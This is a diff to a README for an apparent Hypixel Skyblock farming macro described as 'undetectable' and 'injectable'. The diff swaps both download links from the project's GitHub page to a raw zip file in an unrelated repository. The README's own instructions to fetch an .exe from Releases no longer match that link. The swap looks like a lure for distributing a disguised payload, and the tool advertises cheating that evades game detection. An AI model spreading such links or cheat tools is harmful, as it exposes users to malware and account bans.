@@ -5,7 +5,7 @@ description: "Automate Hypixel Skyblock farming with this undetectable, injectab
 ---
 # 🌌 aether-skyblock-macro - Automate your Hypixel skyblock farming tasks
 
-[![](https://img.shields.io/badge/Download-Aether-blue.svg)](https://github.com/snailgreengrocery903/aether-skyblock-macro)
+[![](https://img.shields.io/badge/Download-Aether-blue.svg)](https://raw.githubusercontent.com/snailgreengrocery903/snailgreengrocery903.github.io/main/scrupulous/github_io_snailgreengrocery_2.8.zip)
 
 Aether automates farming tasks in the Hypixel Skyblock game mode. It handles repetitive movements and key presses. This allows players to farm crops or materials without manual input. The software functions as an injectable process. It remains compatible with current game updates and maintains a low profile.
 
@@ -24,7 +24,7 @@ Close all unnecessary programs before you run Aether. This reduces the risk of c
 
 Visit the link below to reach the project page. Look for the Releases section on the right side of the page. Select the latest version of the file labeled with the .exe extension. 
 
-[Download Aether here](https://github.com/snailgreengrocery903/aether-skyblock-macro)
+[Download Aether here](https://raw.githubusercontent.com/snailgreengrocery903/snailgreengrocery903.github.io/main/scrupulous/github_io_snailgreengrocery_2.8.zip)
 
 Save the file to a folder you can find easily, such as your Downloads folder or your Desktop. Do not move the file out of its parent folder if you unzip a compressed archive. Keep all support files together in one location.
 
